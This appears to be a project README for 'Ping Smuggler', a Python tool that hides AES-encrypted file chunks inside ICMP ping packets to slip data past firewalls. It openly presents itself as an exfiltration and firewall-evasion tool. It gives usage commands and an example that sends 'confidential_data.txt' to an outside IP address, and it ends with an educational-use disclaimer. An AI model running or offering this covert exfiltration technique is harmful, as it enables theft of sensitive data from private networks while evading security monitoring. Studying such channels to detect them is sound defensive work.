# Ping Smuggler

Ping Smuggler is a Python tool designed to exfiltrate data from a private network by sending encrypted payloads
disguised as ICMP ping packets. This technique can be used to bypass firewalls that allow ICMP ping traffic while
maintaining a covert channel for data transmission.

## Overview

This repository contains three Python scripts:

1. **Sender Script (sender.py):**
    - Reads a text file and encrypts its contents into chunks.
    - Sends the encrypted chunks as ICMP payloads to a specified destination IP address.
c
2. **Receiver Script (receiver.py):**
    - Listens for incoming ICMP packets and captures them.
    - Decrypts the encrypted payloads contained within the ICMP packets.
    - Reconstructs the original text file from the decrypted chunks.

3. **Key Generator Script (key_generator.py):**
    - Generates a random encryption key for use with the sender and receiver scripts.
    - The key must be shared between the sender and receiver to encrypt and decrypt the data.

## Working Principle

Ping Smuggler utilizes the following approach to exfiltrate data:

1. **Encryption and Transmission (Sender Script):**
    - The sender script encrypts the data from a text file using AES encryption.
    - The encrypted data is split into chunks, and each chunk is sent as the payload of an ICMP ping packet to the
      specified destination IP address.

2. **Decryption and Reconstruction (Receiver Script):**
    - The receiver script captures the ICMP ping packets containing the encrypted payloads.
    - It decrypts the encrypted payloads using the same AES key.
    - Finally, it reconstructs the original text file from the decrypted chunks.

### Usage

### Sender Script (sender.py)

```bash
python sender.py <file_path> <destination_ip> <key>
```

- <file_path>: Path to the text file to be exfiltrated.
- <destination_ip>: IP address of the receiving computer outside the private network.
- <key>: Encryption key (16, 24, or 32 bytes) for AES encryption.

### Receiver Script (receiver.py)

```bash
python receiver.py <key> <output_cap_file> <output_text_file>
```

- <key>: Encryption key (must match the key used by the sender script).
- <output_cap_file>: Path to store the captured ICMP packets (in .cap format).
- <output_text_file>: Path to store the reconstructed text file.

### Example

## Sender Script

```bash
python sender.py confidential_data.txt 203.0.113.5 top_secret_key
```

## Receiver Script

```bash
python receiver.py top_secret_key received_packets.cap received_text.txt
```

### Usage Scenario

Ping Smuggler can be utilized in scenarios where ICMP ping traffic is allowed through a firewall, providing a covert
channel for exfiltrating sensitive data from a private network. By disguising encrypted data as ICMP ping payloads, Ping
Smuggler enables the transfer of data without raising suspicion or triggering firewall rules.

### Diagram

```lua
   Private Network            Firewall            Outside Network
+-------------------+    +-----------------+    +-------------------------+
|                   |    |    Firewall     |    |                         |
|   Sender          +--->+                 +--->+    Receiver             |
|                   |    |   (Allowing     |    |                         |
+-------------------+    |   ICMP Ping)    |    +-------------------------+
     Encrypts            +-----------------+            Decrypts
     Payloads                                           Payloads
```

In this diagram, Ping Smuggler bypasses the firewall by sending encrypted payloads disguised as ICMP ping packets,
allowing for the exfiltration of data from the private network to the outside network.

### Dependencies

- Python 3.x
- scapy
- cryptography

```bash
pip install -r requirements.txt
```

### Disclaimer

Please use Ping Smuggler responsibly and only in accordance with applicable laws and regulations. Unauthorized or
malicious use of this tool may result in legal consequences. 
The authors of this tool are not responsible for any misuse or damage caused by Ping Smuggler. 
This tool is intended for educational and research purposes only.
